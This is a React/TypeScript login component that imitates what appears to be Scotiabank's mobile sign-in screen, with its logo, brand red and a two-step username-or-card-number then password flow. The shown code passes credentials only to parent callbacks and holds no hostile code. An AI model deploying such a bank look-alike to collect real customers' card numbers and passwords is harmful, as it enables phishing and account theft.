
import React from 'react';
import { ScotiaLogoSVG } from '../components/ScotiaIcons';

interface LoginViewProps {
  stage: string;
  username: string;
  setUsername: (u: string) => void;
  password: string;
  setPassword: (p: string) => void;
  onContinue: () => void;
  onSignIn: () => void;
  onSwitchAccount: () => void;
}

const LoginView: React.FC<LoginViewProps & { theme?: 'light' | 'dark' }> = ({ 
  stage, username, setUsername, password, setPassword, 
  onContinue, onSignIn, onSwitchAccount
}) => {
  const isDark = false; // Force light mode

  return (
    <div className={`absolute inset-0 ${isDark ? 'bg-[#121212] text-white' : 'bg-[#F4F7F9] text-black'} flex flex-col px-8 pt-16 animate-in overflow-hidden z-[50]`}>
      <div className="w-12 h-12 mb-12">
        <ScotiaLogoSVG color="#ED0711" className="w-full h-full" />
      </div>
      
      <h1 className={`text-2xl font-bold mb-10 tracking-tight ${isDark ? 'text-white' : 'text-black'}`}>Sign in</h1>
      
      <div className="space-y-8">
        {stage === 'login_user' ? (
          <div className="animate-in fade-in slide-in-from-right-4">
            <div className={`border-b ${isDark ? 'border-white/10' : 'border-zinc-200'} pb-2 mb-8 flex flex-col transition-all focus-within:border-[#ED0711]`}>
              <label className={`${isDark ? 'text-gray-500' : 'text-zinc-500'} text-[11px] font-medium mb-1`}>Username or card number</label>
              <input 
                type="text" 
                value={username} 
                onChange={e => setUsername(e.target.value)} 
                className={`bg-transparent ${isDark ? 'text-white' : 'text-black'} outline-none w-full text-[14px] font-medium`} 
                autoFocus 
              />
            </div>
            <div className="flex items-center justify-between mb-8">
                <label className="flex items-center gap-3 cursor-pointer group">
                    <div className={`w-5 h-5 rounded border ${isDark ? 'border-white/20' : 'border-zinc-300'} flex items-center justify-center group-active:scale-90 transition-transform`}>
                        {/* Checkbox visual placeholder */}
                    </div>
                    <span className={`${isDark ? 'text-gray-400' : 'text-zinc-600'} text-[12px] font-medium`}>Remember me</span>
                </label>
            </div>
            <button 
                onClick={onContinue} 
                disabled={!username}
                className={`w-full py-4 rounded-full font-bold text-[14px] transition-all ${username ? 'bg-[#ED0711] text-white shadow-md' : (isDark ? 'bg-white/5 text-gray-600' : 'bg-zinc-100 text-zinc-400')}`}
            >
                Continue
            </button>
          </div>
        ) : (
          <div className="animate-in fade-in slide-in-from-right-4">
            <div className={`flex justify-between items-center mb-8 p-4 ${isDark ? 'bg-white/5 border-white/10' : 'bg-zinc-50 border-zinc-100'} rounded-xl border`}>
              <div className="flex flex-col">
                <span className={`${isDark ? 'text-gray-500' : 'text-zinc-500'} text-[10px] font-medium`}>Username or card number</span>
                <span className={`${isDark ? 'text-white' : 'text-black'} font-bold text-[13px]`}>{username}</span>
              </div>
              <button onClick={onSwitchAccount} className="text-[#ED0711] font-bold text-[11px]">Change</button>
            </div>
            
            <div className={`border-b ${isDark ? 'border-white/10' : 'border-zinc-200'} pb-2 mb-10 flex flex-col transition-all focus-within:border-[#ED0711]`}>
              <label className={`${isDark ? 'text-gray-500' : 'text-zinc-500'} text-[11px] font-medium mb-1`}>Password</label>
              <input 
                type="password" 
                value={password} 
                onChange={e => setPassword(e.target.value)} 
                className={`bg-transparent ${isDark ? 'text-white' : 'text-black'} outline-none w-full text-[14px] font-medium`} 
                autoFocus 
              />
            </div>
            
            <div className="space-y-4">
                <button 
                    onClick={onSignIn} 
                    disabled={!password}
                    className={`w-full py-4 rounded-full font-bold text-[14px] transition-all ${password ? 'bg-[#ED0711] text-white shadow-md' : (isDark ? 'bg-white/5 text-gray-600' : 'bg-zinc-100 text-zinc-400')}`}
                >
                    Sign in
                </button>
                
                <button 
                    className={`${isDark ? 'text-gray-500 hover:text-white' : 'text-zinc-500 active:text-black'} w-full py-2 font-bold text-[12px] transition-colors`}
                >
                    Forgot your username or password?
                </button>
            </div>
          </div>
        )}
      </div>
      
      <div className="mt-auto pb-10 flex flex-col items-center gap-6">
          <button className={`${isDark ? 'text-gray-500' : 'text-zinc-500'} font-bold text-[12px]`}>Activate your account</button>
          <div className="flex gap-8">
              <button className={`${isDark ? 'text-gray-600' : 'text-zinc-400'} font-medium text-[10px]`}>Privacy</button>
              <button className={`${isDark ? 'text-gray-600' : 'text-zinc-400'} font-medium text-[10px]`}>Security</button>
              <button className={`${isDark ? 'text-gray-600' : 'text-zinc-400'} font-medium text-[10px]`}>Legal</button>
          </div>
      </div>
    </div>
  );
};

export default LoginView;
